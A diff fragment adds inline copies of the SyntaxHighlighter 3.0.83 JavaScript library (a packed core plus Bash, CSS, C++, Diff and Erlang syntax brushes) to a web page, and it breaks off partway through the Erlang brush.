"1Z://2y.3L.3K/4X/3I/3H/3I-4P.4J"><1z 4I="1Z://2y.3L.3K/4L/5L"><3J><4N 1Z-4M="5G-5M" 6K="2O/1z; 6J=6I-8" /><1t>6L 1v</1t></3J><3B 1L="25-6M:6Q,6P,6O,6N-6F;6y-2f:#6x;2f:#6w;25-22:6v;2O-3D:3C;"><T 1L="2O-3D:3C;3w-32:1.6z;"><T 1L="25-22:6A-6E;">1v</T><T 1L="25-22:.6C;3w-6B:6R;"><T>3v 3.0.76 (72 73 3x)</T><T><a 2h="1Z://3u.2w/1v" 1F="38" 1L="2f:#3y">1Z://3u.2w/1v</a></T><T>70 17 6U 71.</T><T>6T 6X-3x 6Y 6D.</T></T><T>6t 61 60 J 1k, 5Z <a 2h="6u://2y.62.2w/63-66/65?64=5X-5W&5P=5O" 1L="2f:#3y">5R</a> 5V <2R/>5U 5T 5S!</T></T></3B></1z>\'}},1Y:{2j:N,2A:{}},1U:{},3A:{6n:/\\/\\*[\\s\\S]*?\\*\\//2c,6m:/\\/\\/.*$/2c,6l:/#.*$/2c,6k:/"([^\\\\"\\n]|\\\\.)*"/g,6o:/\'([^\\\\\'\\n]|\\\\.)*\'/g,6p:1f M(\'"([^\\\\\\\\"]|\\\\\\\\.)*"\',"3z"),6s:1f M("\'([^\\\\\\\\\']|\\\\\\\\.)*\'","3z"),6q:/(&1y;|<)!--[\\s\\S]*?--(&1G;|>)/2c,3M:/\\w+:\\/\\/[\\w-.\\/?%&=:@;]*/g,6a:{18:/(&1y;|<)\\?=?/g,1b:/\\?(&1G;|>)/g},69:{18:/(&1y;|<)%=?/g,1b:/%(&1G;|>)/g},6d:{18:/(&1y;|<)\\s*1k.*?(&1G;|>)/2T,1b:/(&1y;|<)\\/\\s*1k\\s*(&1G;|>)/2T}},16:{1H:6(a){6 b(i,k){H e.16.2o(i,k,e.13.1x[k])}O(K c=\'<T 1g="16">\',d=e.16.2x,h=d.2X,g=0;g<h.L;g++)c+=(d[h[g]].1H||b)(a,h[g]);c+="</T>";H c},2o:6(a,b,c){H\'<2W><a 2h="#" 1g="6e 6h\'+b+" "+b+\'">\'+c+"</a></2W>"},2b:6(a){K b=a.1F,c=b.1l||"";b=B(p(b,".20",R).1c);K d=6(h){H(h=15(h+"6f(\\\\w+)").X(c))?h[1]:N}("6g");b&&d&&e.16.2x[d].2B(b);a.3N()},2x:{2X:["21","2P"],21:{1H:6(a){I(a.V("2l")!=R)H"";K b=a.V("1t");H e.16.2o(a,"21",b?b:e.13.1x.21)},2B:6(a){a=1E.6j(t(a.1c));a.1l=a.1l.Q("47","")}},2P:{2B:6(){K a="68=0";a+=", 18="+(31.30-33)/2+", 32="+(31.2Z-2Y)/2+", 30=33, 2Z=2Y";a=a.Q(/^,/,"");a=1P.6Z("","38",a);a.2C();K b=a.1E;b.6W(e.13.1x.37);b.6V();a.2C()}}}},35:6(a,b){K c;I(b)c=[b];Y{c=1E.36(e.13.34);O(K d=[],h=0;h<c.L;h++)d.U(c[h]);c=d}c=c;d=[];I(e.13.2M)c=c.1O(z());I(c.L===0)H d;O(h=0;h<c.L;h++){O(K g=c[h],i=a,k=c[h].1l,j=3W 0,l={},m=1f M("^\\\\[(?<2V>(.*?))\\\\]$"),s=1f M("(?<27>[\\\\w-]+)\\\\s*:\\\\s*(?<1T>[\\\\w-%#]+|\\\\[.*?\\\\]|\\".*?\\"|\'.*?\')\\\\s*;?","g");(j=s.X(k))!=N;){K o=j.1T.Q(/^[\'"]|[\'"]$/g,"");I(o!=N&&m.1A(o)){o=m.X(o);o=o.2V.L>0?o.2V.1e(/\\s*,\\s*/):[]}l[j.27]=o}g={1F:g,1n:C(i,l)};g.1n.1D!=N&&d.U(g)}H d},1M:6(a,b){K c=J.35(a,b),d=N,h=e.13;I(c.L!==0)O(K g=0;g<c.L;g++){b=c[g];K i=b.1F,k=b.1n,j=k.1D,l;I(j!=N){I(k["1z-1k"]=="R"||e.2v["1z-1k"]==R){d=1f e.4l(j);j="4O"}Y I(d=A(j))d=1f d;Y 6H;l=i.3X;I(h.2M){l=l;K m=x(l),s=11;I(m.1i("<![6G[")==0){m=m.4h(9);s=R}K o=m.L;I(m.1i("]]\\>")==o-3){m=m.4h(0,o-3);s=R}l=s?m:l}I((i.1t||"")!="")k.1t=i.1t;k.1D=j;d.2Q(k);b=d.2F(l);I((i.1c||"")!="")b.1c=i.1c;i.2G.74(b,i)}}},2E:6(a){w(1P,"4k",6(){e.1M(a)})}};e.2E=e.2E;e.1M=e.1M;e.2L=6(a,b,c){J.1T=a;J.P=b;J.L=a.L;J.23=c;J.1V=N};e.2L.Z.1q=6(){H J.1T};e.4l=6(a){6 b(j,l){O(K m=0;m<j.L;m++)j[m].P+=l}K c=A(a),d,h=1f e.1U.5Y,g=J,i="2F 1H 2Q".1e(" ");I(c!=N){d=1f c;O(K k=0;k<i.L;k++)(6(){K j=i[k];g[j]=6(){H h[j].1p(h,14)}})();d.28==N?1P.1X(e.13.1x.1X+(e.13.1x.4g+a)):h.2J.U({1I:d.28.17,2D:6(j){O(K l=j.17,m=[],s=d.2J,o=j.P+j.18.L,F=d.28,q,G=0;G<s.L;G++){q=y(l,s[G]);b(q,o);m=m.1O(q)}I(F.18!=N&&j.18!=N){q=y(j.18,F.18);b(q,j.P);m=m.1O(q)}I(F.1b!=N&&j.1b!=N){q=y(j.1b,F.1b);b(q,j.P+j[0].5Q(j.1b));m=m.1O(q)}O(j=0;j<m.L;j++)m[j].1V=c.1V;H m}})}};e.4j=6(){};e.4j.Z={V:6(a,b){K c=J.1n[a];c=c==N?b:c;K d={"R":R,"11":11}[c];H d==N?c:d},3Y:6(a){H 1E.4i(a)},4c:6(a,b){K c=[];I(a!=N)O(K d=0;d<a.L;d++)I(1j a[d]=="2m")c=c.1O(y(b,a[d]));H J.4e(c.6b(D))},4e:6(a){O(K b=0;b<a.L;b++)I(a[b]!==N)O(K c=a[b],d=c.P+c.L,h=b+1;h<a.L&&a[b]!==N;h++){K g=a[h];I(g!==N)I(g.P>d)1N;Y I(g.P==c.P&&g.L>c.L)a[b]=N;Y I(g.P>=c.P&&g.P<d)a[h]=N}H a},4d:6(a){K b=[],c=2u(J.V("2i-1s"));v(a,6(d,h){b.U(h+c)});H b},3U:6(a){K b=J.V("1M",[]);I(1j b!="2m"&&b.U==N)b=[b];a:{a=a.1q();K c=3W 0;O(c=c=1Q.6c(c||0,0);c<b.L;c++)I(b[c]==a){b=c;1N a}b=-1}H b!=-1},2r:6(a,b,c){a=["1s","6i"+b,"P"+a,"6r"+(b%2==0?1:2).1q()];J.3U(b)&&a.U("67");b==0&&a.U("1N");H\'<T 1g="\'+a.1K(" ")+\'">\'+c+"</T>"},3Q:6(a,b){K c="",d=a.1e("\\n").L,h=2u(J.V("2i-1s")),g=J.V("2z-1s-2t");I(g==R)g=(h+d-1).1q().L;Y I(3R(g)==R)g=0;O(K i=0;i<d;i++){K k=b?b[i]:h+i,j;I(k==0)j=e.13.1W;Y{j=g;O(K l=k.1q();l.L<j;)l="0"+l;j=l}a=j;c+=J.2r(i,k,a)}H c},49:6(a,b){a=x(a);K c=a.1e("\\n");J.V("2z-1s-2t");K d=2u(J.V("2i-1s"));a="";O(K h=J.V("1D"),g=0;g<c.L;g++){K i=c[g],k=/^(&2s;|\\s)+/.X(i),j=N,l=b?b[g]:d+g;I(k!=N){j=k[0].1q();i=i.1o(j.L);j=j.Q(" ",e.13.1W)}i=x(i);I(i.L==0)i=e.13.1W;a+=J.2r(g,l,(j!=N?\'<17 1g="\'+h+\' 5N">\'+j+"</17>":"")+i)}H a},4f:6(a){H a?"<4a>"+a+"</4a>":""},4b:6(a,b){6 c(l){H(l=l?l.1V||g:g)?l+" ":""}O(K d=0,h="",g=J.V("1D",""),i=0;i<b.L;i++){K k=b[i],j;I(!(k===N||k.L===0)){j=c(k);h+=u(a.1o(d,k.P-d),j+"48")+u(k.1T,j+k.23);d=k.P+k.L+(k.75||0)}}h+=u(a.1o(d),c()+"48");H h},1H:6(a){K b="",c=["20"],d;I(J.V("2k")==R)J.1n.16=J.1n.1u=11;1l="20";J.V("2l")==R&&c.U("47");I((1u=J.V("1u"))==11)c.U("6S");c.U(J.V("1g-27"));c.U(J.V("1D"));a=a.Q(/^[ ]*[\\n]+|[\\n]*[ ]*$/g,"").Q(/\\r/g," ");b=J.V("43-22");I(J.V("42-45")==R)a=n(a,b);Y{O(K h="",g=0;g<b;g++)h+=" ";a=a.Q(/\\t/g,h)}a=a;a:{b=a=a;h=/<2R\\s*\\/?>|&1y;2R\\s*\\/?&1G;/2T;I(e.13.46==R)b=b.Q(h,"\\n");I(e.13.44==R)b=b.Q(h,"");b=b.1e("\\n");h=/^\\s*/;g=4Q;O(K i=0;i<b.L&&g>0;i++){K k=b[i];I(x(k).L!=0){k=h.X(k);I(k==N){a=a;1N a}g=1Q.4q(k[0].L,g)}}I(g>0)O(i=0;i<b.L;i++)b[i]=b[i].1o(g);a=b.1K("\\n")}I(1u)d=J.4d(a);b=J.4c(J.2J,a);b=J.4b(a,b);b=J.49(b,d);I(J.V("41-40"))b=E(b);1j 2H!="1d"&&2H.3S&&2H.3S.1C(/5s/)&&c.U("5t");H b=\'<T 1c="\'+t(J.1c)+\'" 1g="\'+c.1K(" ")+\'">\'+(J.V("16")?e.16.1H(J):"")+\'<3Z 5z="0" 5H="0" 5J="0">\'+J.4f(J.V("1t"))+"<3T><3P>"+(1u?\'<2d 1g="1u">\'+J.3Q(a)+"</2d>":"")+\'<2d 1g="17"><T 1g="3O">\'+b+"</T></2d></3P></3T></3Z></T>"},2F:6(a){I(a===N)a="";J.17=a;K b=J.3Y("T");b.3X=J.1H(a);J.V("16")&&w(p(b,".16"),"5c",e.16.2b);J.V("3V-17")&&w(p(b,".17"),"56",f);H b},2Q:6(a){J.1c=""+1Q.5d(1Q.5n()*5k).1q();e.1Y.2A[t(J.1c)]=J;J.1n=C(e.2v,a||{});I(J.V("2k")==R)J.1n.16=J.1n.1u=11},5j:6(a){a=a.Q(/^\\s+|\\s+$/g,"").Q(/\\s+/g,"|");H"\\\\b(?:"+a+")\\\\b"},5f:6(a){J.28={18:{1I:a.18,23:"1k"},1b:{1I:a.1b,23:"1k"},17:1f M("(?<18>"+a.18.1m+")(?<17>.*?)(?<1b>"+a.1b.1m+")","5o")}}};H e}();1j 2e!="1d"&&(2e.1v=1v);',62,441,'||||||function|||||||||||||||||||||||||||||||||||||return|if|this|var|length|XRegExp|null|for|index|replace|true||div|push|getParam|call|exec|else|prototype||false|lastIndex|config|arguments|RegExp|toolbar|code|left|captureNames|slice|right|id|undefined|split|new|class|addToken|indexOf|typeof|script|className|source|params|substr|apply|toString|String|line|title|gutter|SyntaxHighlighter|_xregexp|strings|lt|html|test|OUTSIDE_CLASS|match|brush|document|target|gt|getHtml|regex|global|join|style|highlight|break|concat|window|Math|isRegExp|throw|value|brushes|brushName|space|alert|vars|http|syntaxhighlighter|expandSource|size|css|case|font|Fa|name|htmlScript|dA|can|handler|gm|td|exports|color|in|href|first|discoveredBrushes|light|collapse|object|cache|getButtonHtml|trigger|pattern|getLineHtml|nbsp|numbers|parseInt|defaults|com|items|www|pad|highlighters|execute|focus|func|all|getDiv|parentNode|navigator|INSIDE_CLASS|regexList|hasFlag|Match|useScriptTags|hasNamedCapture|text|help|init|br|input|gi|Error|values|span|list|250|height|width|screen|top|500|tagName|findElements|getElementsByTagName|aboutDialog|_blank|appendChild|charAt|Array|copyAsGlobal|setFlag|highlighter_|string|attachEvent|nodeName|floor|backref|output|the|TypeError|sticky|Za|iterate|freezeTokens|scope|type|textarea|alexgorbatchev|version|margin|2010|005896|gs|regexLib|body|center|align|noBrush|require|childNodes|DTD|xhtml1|head|org|w3|url|preventDefault|container|tr|getLineNumbersHtml|isNaN|userAgent|tbody|isLineHighlighted|quick|void|innerHTML|create|table|links|auto|smart|tab|stripBrs|tabs|bloggerMode|collapsed|plain|getCodeLinesHtml|caption|getMatchesHtml|findMatches|figureOutLineNumbers|removeNestedMatches|getTitleHtml|brushNotHtmlScript|substring|createElement|Highlighter|load|HtmlScript|Brush|pre|expand|multiline|min|Can|ignoreCase|find|blur|extended|toLowerCase|aliases|addEventListener|innerText|textContent|wasn|select|createTextNode|removeChild|option|same|frame|xmlns|dtd|twice|1999|equiv|meta|htmlscript|transitional|1E3|expected|PUBLIC|DOCTYPE|on|W3C|XHTML|TR|EN|Transitional||configured|srcElement|Object|after|run|dblclick|matchChain|valueOf|constructor|default|switch|click|round|execAt|forHtmlScript|token|gimy|functions|getKeywords|1E6|escape|within|random|sgi|another|finally|supply|MSIE|ie|toUpperCase|catch|returnValue|definition|event|border|imsx|constructing|one|Infinity|from|when|Content|cellpadding|flags|cellspacing|try|xhtml|Type|spaces|2930402|hosted_button_id|lastIndexOf|donate|active|development|keep|to|xclick|_s|Xml|please|like|you|paypal|cgi|cmd|webscr|bin|highlighted|scrollbars|aspScriptTags|phpScriptTags|sort|max|scriptScriptTags|toolbar_item|_|command|command_|number|getElementById|doubleQuotedString|singleLinePerlComments|singleLineCComments|multiLineCComments|singleQuotedString|multiLineDoubleQuotedString|xmlComments|alt|multiLineSingleQuotedString|If|https|1em|000|fff|background|5em|xx|bottom|75em|Gorbatchev|large|serif|CDATA|continue|utf|charset|content|About|family|sans|Helvetica|Arial|Geneva|3em|nogutter|Copyright|syntax|close|write|2004|Alex|open|JavaScript|highlighter|July|02|replaceChild|offset|83'.split('|'),0,{}))
+</script>
+<script type='text/javascript'>
+/* shBrushBash.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		var keywords =	'if fi then elif else for do done until while break continue case function return in eq ne ge le';
+		var commands =  'alias apropos awk basename bash bc bg builtin bzip2 cal cat cd cfdisk chgrp chmod chown chroot' +
+						'cksum clear cmp comm command cp cron crontab csplit cut date dc dd ddrescue declare df ' +
+						'diff diff3 dig dir dircolors dirname dirs du echo egrep eject enable env ethtool eval ' +
+						'exec exit expand export expr false fdformat fdisk fg fgrep file find fmt fold format ' +
+						'free fsck ftp gawk getopts grep groups gzip hash head history hostname id ifconfig ' +
+						'import install join kill less let ln local locate logname logout look lpc lpr lprint ' +
+						'lprintd lprintq lprm ls lsof make man mkdir mkfifo mkisofs mknod more mount mtools ' +
+						'mv netstat nice nl nohup nslookup open op passwd paste pathchk ping popd pr printcap ' +
+						'printenv printf ps pushd pwd quota quotacheck quotactl ram rcp read readonly renice ' +
+						'remsync rm rmdir rsync screen scp sdiff sed select seq set sftp shift shopt shutdown ' +
+						'sleep sort source split ssh strace su sudo sum symlink sync tail tar tee test time ' +
+						'times touch top traceroute trap tr true tsort tty type ulimit umask umount unalias ' +
+						'uname unexpand uniq units unset unshar useradd usermod users uuencode uudecode v vdir ' +
+						'vi watch wc whereis which who whoami Wget xargs yes'
+						;
+
+		this.regexList = [
+			{ regex: /^#!.*$/gm,											css: 'preprocessor bold' },
+			{ regex: /\/[\w-\/]+/gm,										css: 'plain' },
+			{ regex: SyntaxHighlighter.regexLib.singleLinePerlComments,		css: 'comments' },		// one line comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,			css: 'string' },		// double quoted strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,			css: 'string' },		// single quoted strings
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),			css: 'keyword' },		// keywords
+			{ regex: new RegExp(this.getKeywords(commands), 'gm'),			css: 'functions' }		// commands
+			];
+	}
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['bash', 'shell'];
+
+	SyntaxHighlighter.brushes.Bash = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushCss.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		function getKeywordsCSS(str)
+		{
+			return '\\b([a-z_]|)' + str.replace(/ /g, '(?=:)\\b|\\b([a-z_\\*]|\\*|)') + '(?=:)\\b';
+		};
+	
+		function getValuesCSS(str)
+		{
+			return '\\b' + str.replace(/ /g, '(?!-)(?!:)\\b|\\b()') + '\:\\b';
+		};
+
+		var keywords =	'ascent azimuth background-attachment background-color background-image background-position ' +
+						'background-repeat background baseline bbox border-collapse border-color border-spacing border-style border-top ' +
+						'border-right border-bottom border-left border-top-color border-right-color border-bottom-color border-left-color ' +
+						'border-top-style border-right-style border-bottom-style border-left-style border-top-width border-right-width ' +
+						'border-bottom-width border-left-width border-width border bottom cap-height caption-side centerline clear clip color ' +
+						'content counter-increment counter-reset cue-after cue-before cue cursor definition-src descent direction display ' +
+						'elevation empty-cells float font-size-adjust font-family font-size font-stretch font-style font-variant font-weight font ' +
+						'height left letter-spacing line-height list-style-image list-style-position list-style-type list-style margin-top ' +
+						'margin-right margin-bottom margin-left margin marker-offset marks mathline max-height max-width min-height min-width orphans ' +
+						'outline-color outline-style outline-width outline overflow padding-top padding-right padding-bottom padding-left padding page ' +
+						'page-break-after page-break-before page-break-inside pause pause-after pause-before pitch pitch-range play-during position ' +
+						'quotes right richness size slope src speak-header speak-numeral speak-punctuation speak speech-rate stemh stemv stress ' +
+						'table-layout text-align top text-decoration text-indent text-shadow text-transform unicode-bidi unicode-range units-per-em ' +
+						'vertical-align visibility voice-family volume white-space widows width widths word-spacing x-height z-index';
+
+		var values =	'above absolute all always aqua armenian attr aural auto avoid baseline behind below bidi-override black blink block blue bold bolder '+
+						'both bottom braille capitalize caption center center-left center-right circle close-quote code collapse compact condensed '+
+						'continuous counter counters crop cross crosshair cursive dashed decimal decimal-leading-zero default digits disc dotted double '+
+						'embed embossed e-resize expanded extra-condensed extra-expanded fantasy far-left far-right fast faster fixed format fuchsia '+
+						'gray green groove handheld hebrew help hidden hide high higher icon inline-table inline inset inside invert italic '+
+						'justify landscape large larger left-side left leftwards level lighter lime line-through list-item local loud lower-alpha '+
+						'lowercase lower-greek lower-latin lower-roman lower low ltr marker maroon medium message-box middle mix move narrower '+
+						'navy ne-resize no-close-quote none no-open-quote no-repeat normal nowrap n-resize nw-resize oblique olive once open-quote outset '+
+						'outside overline pointer portrait pre print projection purple red relative repeat repeat-x repeat-y rgb ridge right right-side '+
+						'rightwards rtl run-in screen scroll semi-condensed semi-expanded separate se-resize show silent silver slower slow '+
+						'small small-caps small-caption smaller soft solid speech spell-out square s-resize static status-bar sub super sw-resize '+
+						'table-caption table-cell table-column table-column-group table-footer-group table-header-group table-row table-row-group teal '+
+						'text-bottom text-top thick thin top transparent tty tv ultra-condensed ultra-expanded underline upper-alpha uppercase upper-latin '+
+						'upper-roman url visible wait white wider w-resize x-fast x-high x-large x-loud x-low x-slow x-small x-soft xx-large xx-small yellow';
+
+		var fonts =		'[mM]onospace [tT]ahoma [vV]erdana [aA]rial [hH]elvetica [sS]ans-serif [sS]erif [cC]ourier mono sans serif';
+	
+		this.regexList = [
+			{ regex: SyntaxHighlighter.regexLib.multiLineCComments,		css: 'comments' },	// multiline comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },	// double quoted strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },	// single quoted strings
+			{ regex: /\#[a-fA-F0-9]{3,6}/g,								css: 'value' },		// html colors
+			{ regex: /(-?\d+)(\.\d+)?(px|em|pt|\:|\%|)/g,				css: 'value' },		// sizes
+			{ regex: /!important/g,										css: 'color3' },	// !important
+			{ regex: new RegExp(getKeywordsCSS(keywords), 'gm'),		css: 'keyword' },	// keywords
+			{ regex: new RegExp(getValuesCSS(values), 'g'),				css: 'value' },		// values
+			{ regex: new RegExp(this.getKeywords(fonts), 'g'),			css: 'color1' }		// fonts
+			];
+
+		this.forHtmlScript({ 
+			left: /(&lt;|<)\s*style.*?(&gt;|>)/gi, 
+			right: /(&lt;|<)\/\s*style\s*(&gt;|>)/gi 
+			});
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['css'];
+
+	SyntaxHighlighter.brushes.CSS = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushCpp.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		// Copyright 2006 Shin, YoungJin
+	
+		var datatypes =	'ATOM BOOL BOOLEAN BYTE CHAR COLORREF DWORD DWORDLONG DWORD_PTR ' +
+						'DWORD32 DWORD64 FLOAT HACCEL HALF_PTR HANDLE HBITMAP HBRUSH ' +
+						'HCOLORSPACE HCONV HCONVLIST HCURSOR HDC HDDEDATA HDESK HDROP HDWP ' +
+						'HENHMETAFILE HFILE HFONT HGDIOBJ HGLOBAL HHOOK HICON HINSTANCE HKEY ' +
+						'HKL HLOCAL HMENU HMETAFILE HMODULE HMONITOR HPALETTE HPEN HRESULT ' +
+						'HRGN HRSRC HSZ HWINSTA HWND INT INT_PTR INT32 INT64 LANGID LCID LCTYPE ' +
+						'LGRPID LONG LONGLONG LONG_PTR LONG32 LONG64 LPARAM LPBOOL LPBYTE LPCOLORREF ' +
+						'LPCSTR LPCTSTR LPCVOID LPCWSTR LPDWORD LPHANDLE LPINT LPLONG LPSTR LPTSTR ' +
+						'LPVOID LPWORD LPWSTR LRESULT PBOOL PBOOLEAN PBYTE PCHAR PCSTR PCTSTR PCWSTR ' +
+						'PDWORDLONG PDWORD_PTR PDWORD32 PDWORD64 PFLOAT PHALF_PTR PHANDLE PHKEY PINT ' +
+						'PINT_PTR PINT32 PINT64 PLCID PLONG PLONGLONG PLONG_PTR PLONG32 PLONG64 POINTER_32 ' +
+						'POINTER_64 PSHORT PSIZE_T PSSIZE_T PSTR PTBYTE PTCHAR PTSTR PUCHAR PUHALF_PTR ' +
+						'PUINT PUINT_PTR PUINT32 PUINT64 PULONG PULONGLONG PULONG_PTR PULONG32 PULONG64 ' +
+						'PUSHORT PVOID PWCHAR PWORD PWSTR SC_HANDLE SC_LOCK SERVICE_STATUS_HANDLE SHORT ' +
+						'SIZE_T SSIZE_T TBYTE TCHAR UCHAR UHALF_PTR UINT UINT_PTR UINT32 UINT64 ULONG ' +
+						'ULONGLONG ULONG_PTR ULONG32 ULONG64 USHORT USN VOID WCHAR WORD WPARAM WPARAM WPARAM ' +
+						'char bool short int __int32 __int64 __int8 __int16 long float double __wchar_t ' +
+						'clock_t _complex _dev_t _diskfree_t div_t ldiv_t _exception _EXCEPTION_POINTERS ' +
+						'FILE _finddata_t _finddatai64_t _wfinddata_t _wfinddatai64_t __finddata64_t ' +
+						'__wfinddata64_t _FPIEEE_RECORD fpos_t _HEAPINFO _HFILE lconv intptr_t ' +
+						'jmp_buf mbstate_t _off_t _onexit_t _PNH ptrdiff_t _purecall_handler ' +
+						'sig_atomic_t size_t _stat __stat64 _stati64 terminate_function ' +
+						'time_t __time64_t _timeb __timeb64 tm uintptr_t _utimbuf ' +
+						'va_list wchar_t wctrans_t wctype_t wint_t signed';
+
+		var keywords =	'break case catch class const __finally __exception __try ' +
+						'const_cast continue private public protected __declspec ' +
+						'default delete deprecated dllexport dllimport do dynamic_cast ' +
+						'else enum explicit extern if for friend goto inline ' +
+						'mutable naked namespace new noinline noreturn nothrow ' +
+						'register reinterpret_cast return selectany ' +
+						'sizeof static static_cast struct switch template this ' +
+						'thread throw true false try typedef typeid typename union ' +
+						'using uuid virtual void volatile whcar_t while';
+					
+		var functions =	'assert isalnum isalpha iscntrl isdigit isgraph islower isprint' +
+						'ispunct isspace isupper isxdigit tolower toupper errno localeconv ' +
+						'setlocale acos asin atan atan2 ceil cos cosh exp fabs floor fmod ' +
+						'frexp ldexp log log10 modf pow sin sinh sqrt tan tanh jmp_buf ' +
+						'longjmp setjmp raise signal sig_atomic_t va_arg va_end va_start ' +
+						'clearerr fclose feof ferror fflush fgetc fgetpos fgets fopen ' +
+						'fprintf fputc fputs fread freopen fscanf fseek fsetpos ftell ' +
+						'fwrite getc getchar gets perror printf putc putchar puts remove ' +
+						'rename rewind scanf setbuf setvbuf sprintf sscanf tmpfile tmpnam ' +
+						'ungetc vfprintf vprintf vsprintf abort abs atexit atof atoi atol ' +
+						'bsearch calloc div exit free getenv labs ldiv malloc mblen mbstowcs ' +
+						'mbtowc qsort rand realloc srand strtod strtol strtoul system ' +
+						'wcstombs wctomb memchr memcmp memcpy memmove memset strcat strchr ' +
+						'strcmp strcoll strcpy strcspn strerror strlen strncat strncmp ' +
+						'strncpy strpbrk strrchr strspn strstr strtok strxfrm asctime ' +
+						'clock ctime difftime gmtime localtime mktime strftime time';
+
+		this.regexList = [
+			{ regex: SyntaxHighlighter.regexLib.singleLineCComments,	css: 'comments' },			// one line comments
+			{ regex: SyntaxHighlighter.regexLib.multiLineCComments,		css: 'comments' },			// multiline comments
+			{ regex: SyntaxHighlighter.regexLib.doubleQuotedString,		css: 'string' },			// strings
+			{ regex: SyntaxHighlighter.regexLib.singleQuotedString,		css: 'string' },			// strings
+			{ regex: /^ *#.*/gm,										css: 'preprocessor' },
+			{ regex: new RegExp(this.getKeywords(datatypes), 'gm'),		css: 'color1 bold' },
+			{ regex: new RegExp(this.getKeywords(functions), 'gm'),		css: 'functions bold' },
+			{ regex: new RegExp(this.getKeywords(keywords), 'gm'),		css: 'keyword bold' }
+			];
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['cpp', 'c'];
+
+	SyntaxHighlighter.brushes.Cpp = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushDiff.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		this.regexList = [
+			{ regex: /^\+\+\+.*$/gm,		css: 'color2' },
+			{ regex: /^\-\-\-.*$/gm,		css: 'color2' },
+			{ regex: /^\s.*$/gm,			css: 'color1' },
+			{ regex: /^@@.*@@$/gm,			css: 'variable' },
+			{ regex: /^\+[^\+]{1}.*$/gm,	css: 'string' },
+			{ regex: /^\-[^\-]{1}.*$/gm,	css: 'comments' }
+			];
+	};
+
+	Brush.prototype	= new SyntaxHighlighter.Highlighter();
+	Brush.aliases	= ['diff', 'patch'];
+
+	SyntaxHighlighter.brushes.Diff = Brush;
+
+	// CommonJS
+	typeof(exports) != 'undefined' ? exports.Brush = Brush : null;
+})();
+</script>
+<script type='text/javascript'>
+/* shBrushErlang.js */
+/**
+ * SyntaxHighlighter
+ * http://alexgorbatchev.com/SyntaxHighlighter
+ *
+ * SyntaxHighlighter is donationware. If you are using it, please donate.
+ * http://alexgorbatchev.com/SyntaxHighlighter/donate.html
+ *
+ * @version
+ * 3.0.83 (July 02 2010)
+ * 
+ * @copyright
+ * Copyright (C) 2004-2010 Alex Gorbatchev.
+ *
+ * @license
+ * Dual licensed under the MIT and GPL licenses.
+ */
+;(function()
+{
+	// CommonJS
+	typeof(require) != 'undefined' ? SyntaxHighlighter = require('shCore').SyntaxHighlighter : null;
+
+	function Brush()
+	{
+		// Contributed by Jean-Lou Dupont
+		// http://jldupont.blogspot.com/2009/06/erlang-syntax-highlighter.html  
+
+		// According to: http://erlang.org/doc/reference_manual/introduction.html#1.5
+		var keywords = 'after and andalso band begin bnot bor bsl bsr bxor '+
+			'case catch cond div end fun if let not of or orelse '+
+			'query receive rem try when xor'+
+			// additional
+			' module export import define';
+
+		this.regexList = [
+			{ regex: new RegExp("[A-Z][A-Za-z0-9_]+", 'g'), 			css: 'constants' },
+			{ regex: new RegExp("\\%.+", 'gm'), 						css: 'comments' },
